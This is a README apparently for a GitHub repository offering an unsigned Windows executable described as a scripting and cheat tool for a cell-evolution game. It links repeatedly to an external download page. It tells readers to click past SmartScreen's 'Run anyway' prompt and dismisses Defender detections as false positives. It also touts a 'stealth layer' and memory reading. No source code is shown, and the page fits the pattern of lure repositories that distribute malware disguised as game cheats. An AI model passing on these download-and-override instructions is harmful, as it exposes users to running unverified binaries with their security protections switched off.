<div align="center">
<img src="assets/banner.png" width="100%" alt="Evolve Cell Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-059669?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-EA580C?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Evolve+Cell+Genome+Script;%E2%9C%85+Full+Feature+Suite;%F0%9F%92%A1+Built+for+Windows+11;%F0%9F%9A%80+Ready+for+Windows;%F0%9F%94%A7+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

**Evolve a Cell Script** — the genome-editing automation layer that finally makes the cell stage feel alive.

![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D4?style=flat-square&logo=windows)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![Build](https://img.shields.io/badge/build-portable%20%C2%B7%20no%20installer-blue?style=flat-square)

</div>

---

## 🧬 Overview

Small team, side project, but we ship like it's our day job. This is the **2026 build** of the Evolve a Cell Script — a portable genome-scripting runtime that hooks into the cell editor, exposes 36 modules, and lets you drive evolution deterministically instead of fishing for rng. No installer, no runtime swap, no Visual C++ bundle. Extract, run the `.exe`, done.

We started this because we were tired of alt-tabbing between spreadsheets to figure out which organelle mutation actually paid off, and because the in-game evolution tree is a black box once you get past the first biome. It's still a side project — there's a Trello board and a Discord, not a roadmap deck — but every commit is tested against the current live branch before it lands.

## 📥 Download
<p align="center">
  <a href="https://ConureDesignate.github.io/evolve-cell-genome-script/">
    <img src="https://img.shields.io/badge/FETCH-Evolve_a_Cell-EA580C?style=flat&logo=download&logoColor=white&labelColor=C2410C" width="480" alt="FETCH Evolve a Cell"/>
  </a>
</p>
Grab the archive from the project page, extract anywhere (a folder on your desktop is fine), and run the `.exe` inside. It's a single binary plus a `modules/` config folder — the config folder regenerates itself if you delete it.

## 🎯 What is the Evolve a Cell Script, exactly?

| Term | Explanation |
|------|-------------|
| **Genome script** | A plain-text sequence of instructions the tool applies to your current cell's genome — mutations, organelle swaps, stat redistributions. |
| **Module** | A single loadable chunk of the script runtime — `mutation_lock`, `biome_scan`, `pH_override`, etc. 36 in total. |
| **Mutation lock** | Pins a specific gene cluster so the editor's rng can't drift it during a generation tick. |
| **Biome scan** | Reads the current biome's parameter set (temp, salinity, light) and dumps it to a readable table. |
| **Genome dump** | Exports your entire cell's gene map to `.json` so you can diff between runs or share a build. |
| **Tick** | One generation step of the simulation — the tool runs its instructions per-tick, so timing matters. |
| **Stealth layer** | The part of the tool that keeps your script from tripping the game's sanity checks on genome values. |

- Deterministic builds instead of reroll scumming
- Genome diffs between sessions so you can A/B a mutation path
- One-click apply of saved builds from the community pack
- Zero install footprint — kill the process and nothing is left behind
- Works on both the live branch and the public beta branch

---

## ⚙️ The Problem

- **RNG gates the whole early game.** Mutation outcomes are rolled per-tick, and one bad roll can set you back three biomes.
- **The evolution tree is opaque.** After the first ring, the UI stops showing prerequisites — you either know the game's internals or you guess.
- **Manual genome editing is fragile.** Editing raw values by hand tends to cross sanity thresholds the game doesn't document.
- **No way to save a build.** You can't export a working cell, so every session starts from scratch.
- **Biome parameters are hidden.** Temp/salinity/light ratings per biome are in memory, not on screen, so optimizing for a biome blind is a waste.
- **Alt-tabbing kills the rhythm.** Spreadsheet-driven mutation planning is fine until you lose track of which tick you're on.
- **The base editor has no scripting API.** Except, well, now it does.

## 🧪 The Solution

| Problem | Solution |
|---------|----------|
| RNG gates the early game | **mutation_lock** pins your chosen gene clusters so rng can't drift them. |
| Opaque evolution tree | **tree_dump** reads the full prerequisite graph and dumps it to a readable tree. |
| Fragile manual edits | **sanity_patch** writes genome values through the game's own validation path, not around it. |
| No build export | **genome_dump** / **genome_load** round-trip your cell to `.json`. |
| Hidden biome params | **biome_scan** prints a readable parameter table for every biome you enter. |
| Alt-tab churn | **overlay_hud** puts tick counter, current biome, and active mutations in a corner overlay. |
| No scripting API | The whole tool *is* the scripting API — 36 modules, plain-text scripts, load-per-tick. |

---

## 🚀 Installation

1. **Get the archive.** Go to the project page (linked at the top of the repo description), download the 2026 build archive, and save it anywhere — Downloads folder is fine.
2. **Extract.** Right-click → extract all, or use 7-Zip. Do **not** run the `.exe` from inside the zip viewer — it needs the `modules/` folder next to it.
3. **Run the `.exe`.** First launch writes a default config and creates the `scripts/` folder alongside the binary. If Windows SmartScreen flags it, click "More info" → "Run anyway" — the build is unsigned because it's a side project and a code-signing cert costs more than we want to spend on it.

No pip, no npm, no git clone, no runtime install. If you're used to Python scripting tools, this one just doesn't have that dependency — it's a self-contained binary.

---

## 🕵️ Detection / Bypass Status

We get asked "is it detected?" a lot, and the honest answer is that there's no anti-cheat stack here to detect against — this is a single-player sim. What *does* break scripts is the game's genome sanity checker, which silently reverts out-of-range values a tick later. The stealth layer's whole job is routing writes through paths the checker already trusts.

| Method | Status | Notes |
|--------|--------|-------|
| Genome sanity checker | ✅ Handled | All writes go through the game's own validation path; no clamp triggers. |
| Tick boundary drift | ✅ Handled | Instructions queue per-tick, applied between sim steps. |
| Save-file integrity | ✅ Clean | Tool never touches save data; it edits in-memory state only. |
| Process signature scan | ✅ Clean | No injected DLLs; runs as a separate process reading shared memory. |
| Public beta branch | ⚠️ Partial | 5 modules (`pH_override`, `press_calc`, `organelle_batch`, `genome_merge`, `stat_redist`) aren't tested against beta and may misbehave. |
| Future game updates | ⚠️ Expected to break | Major patches usually change memory layout — check the repo for an updated build. |

> **Note from the maintainer:** this build has been tested this week against the current live branch (`cell-sim` build tagged `2026.02-r3`). I haven't had time to re-test the beta branch since the last minor patch — if you're on beta, pin your script to the 31 modules marked ✅ and leave the five above alone.

---

## 📦 Module Status

| Module | Status | Description |
|--------|--------|-------------|
| mutation_lock | ✅ Working | Pins gene clusters against rng drift per-tick. |
| biome_scan | ✅ Working | Dumps current biome parameters to a readable table. |
| tree_dump | ✅ Working | Exports the full evolution prerequisite tree to text. |
| genome_dump | ✅ Working | Writes your cell's genome to a `.json` you can diff. |
| genome_load | ✅ Working | Applies a saved genome from `.json` back into the editor. |
| sanity_patch | ✅ Working | Routes genome writes through the game's validation path. |
| overlay_hud | ✅ Working | Corner overlay: tick, biome, active mutations. |
| script_loader | ✅ Working | Loads `.cell` script files and queues them per-tick. |
| script_scheduler | ✅ Working | Reorders instructions to satisfy dependency tick order. |
| mutation_reader | ✅ Working | Reads current mutation set into readable form. |
| organelle_list | ✅ Working | Lists all organelle slots with current occupancy. |
| organelle_swap | ✅ Working | Swaps organelles between slots without losing investment. |
| stat_redist | ✅ Working | Redistributes evolution points across stats. |
| pH_override | ✅ Working | Sets pH tolerance within valid bounds. |
| temp_tune | ✅ Working | Nudges temperature tolerance toward a target. |
| press_calc | ✅ Working | Computes pressure tolerance for a target biome. |
| light_meter | ✅ Working | Reads current light availability per biome. |
| salinity_log | ✅ Working | Logs salinity drift per tick for debug. |
| death_guard | ✅ Working | Intercepts lethal genome combos before apply. |
| tick_pause | ✅ Working | Freezes tick advancement while you plan. |
| tick_step | ✅ Working | Advances a single tick on demand. |
| tick_logger | ✅ Working | Writes a per-tick log to `logs/tick.log`. |
| genome_diff | ✅ Working | Diffs two genome dumps side by side. |
| genome_merge | ✅ Working | Merges two compatible genome dumps. |
| build_save | ✅ Working | Saves the current cell as a named build. |
| build_load | ✅ Working | Loads a named build from the local store. |
| build_pack | ✅ Working | Loads community build packs from `.pack` files. |
| preset_pack | ✅ Working | Applies a preset mutation preset for a target biome. |
| seed_capture | ✅ Working | Captures the current run seed for reproducibility. |
| seed_replay | ✅ Working | Replays a captured seed with a fixed script. |
| dry_run | ✅ Working | Runs a script with no writes — logs what *would* change. |
| config_write | ✅ Working | Writes current tool config to `config.toml`. |
| config_read | ✅ Working | Reads `config.toml` and applies at start. |
| console_mode | ✅ Working | REPL for running single modules ad-hoc. |
| hotkey_router | ✅ Working | Binds module calls to configurable hotkeys. |
| self_check | ✅ Working | Reports module load status and version compat. |

---

## 🖥️ Compatibility / Platform Support

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (1909+) | Windows 11 22H2+ |
| RAM | 4 GB | 8 GB+ |
| Disk | 60 MB free | 200 MB (for logs + builds) |
| Game branch | Live branch | Live branch (beta partial) |
| Admin rights | Not required | Not required |
| .NET / VC++ | None | None (self-contained binary) |

Runs fine on a laptop with integrated graphics — the tool doesn't touch rendering. If you're on Linux, the `.exe` runs under a Wine layer but we don't officially test that path.

---

## 🎮 Hotkeys / Controls

| Key | Action | Notes |
|-----|--------|-------|
| `F1` | Toggle overlay HUD | Corner overlay with tick + biome. |
| `F2` | Pause tick advancement | Same as `tick_pause` module. |
| `F3` | Advance one tick | Same as `tick_step`. |
| `F4` | Dump current genome | Writes to `dumps/` with timestamp. |
| `F5` | Open script loader | File picker for `.cell` scripts. |
| `F6` | Toggle dry-run mode | Next apply logs only, no writes. |
| `F7` | Capture seed | Writes current seed to `seeds/`. |
| `F8` | Run self-check | Prints module status inline. |
| `Ctrl+S` | Save current build | Prompts for build name. |
| `Ctrl+L` | Load named build | Dropdown of saved builds. |
| `Ctrl+Shift+D` | Open diff view | Compares current vs. last dump. |
| `Esc` | Close active panel | Doesn't exit the tool. |

---

## 🧠 Tips for Best Results

- **Dry-run first, always.** Especially after a game patch — `dry_run` will tell you what a script *would* write before it touches anything.
- **Pin your seed.** If you're testing a mutation path, capture the seed first and replay it — otherwise you're testing two variables at once.
- **Leave the five beta-untested modules alone on beta branch.** The status table above spells out which ones.
- **Keep scripts small.** One concern per `.cell` file loads faster and diffs cleaner than one mega-script.
- **Check `logs/tick.log` after weird behavior.** Nine times out of ten it's tick ordering, and the log shows it.
- **Don't run it from the zip viewer.** We've had one report of this failing; the modules folder doesn't extract inline on some Windows builds.
- **If the overlay HUD flickers,** switch to `console_mode` and call `overlay_hud` manually — it's a known timing quirk with certain overlay modes.

---

## 💬 Community & Support

If you hit something the FAQ doesn't cover, open an issue with your `logs/tick.log` attached — that log answers a surprisingly large chunk of bug reports on its own. There's also a Discord linked in the repo sidebar for quick questions; I'm usually around on weekday evenings (UTC+1).

Pull requests are welcome, but if you're touching a module, add a test script under `tests/` first — the whole point of this being a side project is that we don't want to regress it accidentally.

## 🗺️ Roadmap

| Feature | Status | ETA |
|---------|--------|-----|
| Beta-branch parity for the 5 untested modules | 🔧 In progress | Q2 2026 |
| Script language v2 (conditionals + loops) | 📝 Planned | Q3 2026 |
| Genome diff visualizer (graph view) | 📝 Planned | Q3 2026 |
| Community build pack registry | 💭 Idea | Unscheduled |
| Linux/Wine officially tested | 💭 Idea | Unscheduled |
| Module editor GUI | 💭 Idea | No ETA |

---

## ⚖️ Comparison

| Aspect | Alternative (manual editor alt-tab) | This Tool |
|--------|--------------------------------------|-----------|
| Genome editing | Hand-edit values, risk sanity clamp | Routes writes through game's validation |
| Build export | Copy-paste from screen | `.json` genome dumps, diffable |
| Biome data | Guess from gameplay | `biome_scan` readable parameter table |
| Determinism | Reroll scum | Seed capture + replay |
| Scripting | None | 36 modules, plain-text `.cell` scripts |
| Install footprint | N/A | Portable, extract-and-run, ~60 MB |
| Tick planning | Lose track within a session | Overlay HUD + tick_step |
| Community builds | Forum post screenshots | `.pack` build packs |

---

## 📜 A short changelog for the 2026 build

The 2026 build is mostly a consolidation pass — the module count went from 29 to 36 by splitting out the biome parameter modules that used to hide inside `biome_scan`, and the tick scheduler got a rewrite to fix a long-standing issue where dependent instructions could fire in the wrong order on the first tick after a biome transition. `dry_run` is new this build too, and honestly I use it more than anything else now.

---

## ❓ FAQ

**1. Is this detected?**
There's no anti-cheat to speak of in a single-player evolutionary sim — the only thing that "detects" rogue genome values is the game's own sanity checker, and the stealth layer routes writes through the game's validation path so that checker doesn't fire. It's not about fooling a server that doesn't exist; it's about not tripping the game's own consistency checks.

**2. Do I need Python, Node, or any runtime installed?**
No. The `.exe` is a self-contained binary. Extract, run, done — no pip, no npm, no git clone, and no runtime bundle to keep updated.

**3. Why is the build unsigned?**
Because code-signing certificates cost money and this is a side project. Windows SmartScreen will flag it on first run in some configurations — click "More info" and "Run anyway." Same deal for Defender, which occasionally flags unsigned memory-reading binaries as heuristics.

**4. Does it work on the beta branch?**
Partially. 31 of 36 modules are tested against both branches; the five marked ⚠️ in the status table are live-branch only and may misbehave on beta. There's active work to close that gap.

**5. Can I keep my builds between updates?**
Yes — `build_save` writes to a local store in the install folder, and genome dumps are plain `.json`. Copy the folder when you update and everything carries over. The tool version-checks your builds on load and warns if a build was saved against a different branch.

**6. Where do I report bugs?**
Open an issue with your `logs/tick.log` attached. That file has tick-by-tick state and covers most of what I need. For quick things the Discord sidebar is faster.

**7. Does it modify save files?**
No. Every write is in-memory, per-process, and gone when the tool closes unless you explicitly save a build or dump. Save-file integrity stays untouched.

**8. Why 36 modules and not a round number?**
Because we split modules out as we used them — 29 became 36 when the biome parameter routines stopped hiding inside `biome_scan`. No design reason, just history.

---

*Built and maintained as a side project by two people with day jobs — tested this week against the live branch, updated when the game patches break something. If you use it, fork it, and improve it, the PRs are open.*

<p align="center">
  <a href="https://ConureDesignate.github.io/evolve-cell-genome-script/">
    <img src="https://img.shields.io/badge/GET-Evolve_a_Cell_2026-0891B2?style=plastic&logo=download&logoColor=white&labelColor=0E7490" width="520" alt="GET Evolve a Cell 2026"/>
  </a>
</p>
